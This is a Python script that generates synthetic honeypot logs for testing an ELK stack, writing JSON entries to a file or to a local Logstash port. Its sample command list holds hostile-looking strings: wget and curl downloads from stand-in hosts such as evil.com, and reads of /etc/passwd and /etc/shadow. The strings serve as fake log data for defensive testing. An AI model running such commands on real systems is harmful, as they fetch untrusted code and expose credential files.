#!/usr/bin/env python3
"""
Generate sample honeypot logs for testing the ELK stack
"""

import json
import random
import time
from datetime import datetime, timedelta
from pathlib import Path
import socket
import logging
from typing import Dict, List, Optional

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('generate_logs.log')
    ]
)
logger = logging.getLogger(__name__)

class SampleLogGenerator:
    """Generate sample honeypot logs"""
    
    def __init__(self, output_dir: str = "logs"):
        """Initialize the log generator"""
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        
        # Sample data
        self.usernames = ["root", "admin", "user", "test", "oracle", "mysql"]
        self.passwords = ["123456", "password", "admin", "root", "test", "12345"]
        self.commands = [
            "wget http://malicious.com/script.sh -O /tmp/script.sh",
            "curl -O http://evil.com/tool",
            "uname -a",
            "whoami",
            "cat /etc/passwd",
            "ps aux",
            "netstat -tuln",
            "ifconfig",
            "ls -la /tmp",
            "cat /etc/shadow"
        ]
        self.threat_levels = ["scanner", "amateur", "advanced"]
        self.event_types = ["ssh_login", "command_execution", "file_upload"]
        self.countries = ["US", "CN", "RU", "IN", "BR", "ID", "PK", "NG", "BD", "JP"]
    
    def generate_ip(self) -> str:
        """Generate a random IP address"""
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"
    
    def generate_timestamp(self, days_back: int = 7) -> str:
        """Generate a random timestamp within the last N days"""
        now = datetime.utcnow()
        random_days = random.uniform(0, days_back)
        random_seconds = random.uniform(0, 24 * 60 * 60)
        timestamp = now - timedelta(days=random_days, seconds=random_seconds)
        return timestamp.isoformat() + "Z"
    
    def generate_log_entry(self) -> Dict:
        """Generate a single log entry"""
        threat_level = random.choices(
            self.threat_levels,
            weights=[0.5, 0.3, 0.2],
            k=1
        )[0]
        
        entry = {
            "@timestamp": self.generate_timestamp(),
            "source_ip": self.generate_ip(),
            "destination_ip": "192.168.1.1",
            "username": random.choice(self.usernames) if random.random() > 0.3 else "",
            "password": random.choice(self.passwords) if random.random() > 0.5 else "",
            "command": random.choice(self.commands) if random.random() > 0.4 else "",
            "threat_level": threat_level,
            "event_type": random.choice(self.event_types),
            "bytes_sent": random.randint(100, 10000),
            "bytes_received": random.randint(100, 5000),
            "duration": random.uniform(0.1, 10.0),
            "country": random.choice(self.countries),
            "message": ""
        }
        
        # Generate a realistic message based on event type
        if entry["event_type"] == "ssh_login":
            entry["message"] = f"SSH login attempt: {entry['username']} from {entry['source_ip']}"
        elif entry["event_type"] == "command_execution":
            entry["message"] = f"Command executed: {entry['command']}"
        else:  # file_upload
            entry["message"] = f"File upload detected from {entry['source_ip']}"
        
        return entry
    
    def generate_logs(self, num_entries: int = 1000, batch_size: int = 100) -> str:
        """
        Generate log entries and save to a file
        
        Args:
            num_entries: Total number of log entries to generate
            batch_size: Number of entries per file
            
        Returns:
            Path to the generated log file
        """
        output_file = self.output_dir / f"honeypot_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}.log"
        
        logger.info(f"Generating {num_entries} log entries to {output_file}")
        
        with open(output_file, 'w') as f:
            for i in range(num_entries):
                entry = self.generate_log_entry()
                f.write(json.dumps(entry) + "\n")
                
                if (i + 1) % 100 == 0:
                    logger.info(f"Generated {i + 1}/{num_entries} log entries")
        
        logger.info(f"Log generation complete. File: {output_file}")
        return str(output_file)
    
    def send_to_logstash(self, host: str = 'localhost', port: int = 5000, num_entries: int = 100):
        """
        Send log entries directly to Logstash via TCP
        
        Args:
            host: Logstash host
            port: Logstash TCP port
            num_entries: Number of entries to send
        """
        logger.info(f"Sending {num_entries} log entries to {host}:{port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, port))
            
            for _ in range(num_entries):
                entry = self.generate_log_entry()
                sock.sendall((json.dumps(entry) + "\n").encode('utf-8'))
                time.sleep(0.1)  # Small delay to simulate real traffic
            
            sock.close()
            logger.info("Successfully sent logs to Logstash")
            
        except Exception as e:
            logger.error(f"Error sending logs to Logstash: {e}")

def main():
    """Main function"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Generate sample honeypot logs')
    parser.add_argument('--output-dir', type=str, default='logs',
                      help='Directory to save log files')
    parser.add_argument('--num-entries', type=int, default=1000,
                      help='Number of log entries to generate')
    parser.add_argument('--send-to-logstash', action='store_true',
                      help='Send logs directly to Logstash')
    parser.add_argument('--logstash-host', type=str, default='localhost',
                      help='Logstash host')
    parser.add_argument('--logstash-port', type=int, default=5000,
                      help='Logstash TCP port')
    
    args = parser.parse_args()
    
    generator = SampleLogGenerator(args.output_dir)
    
    if args.send_to_logstash:
        generator.send_to_logstash(
            host=args.logstash_host,
            port=args.logstash_port,
            num_entries=args.num_entries
        )
    else:
        generator.generate_logs(num_entries=args.num_entries)

if __name__ == "__main__":
    main()
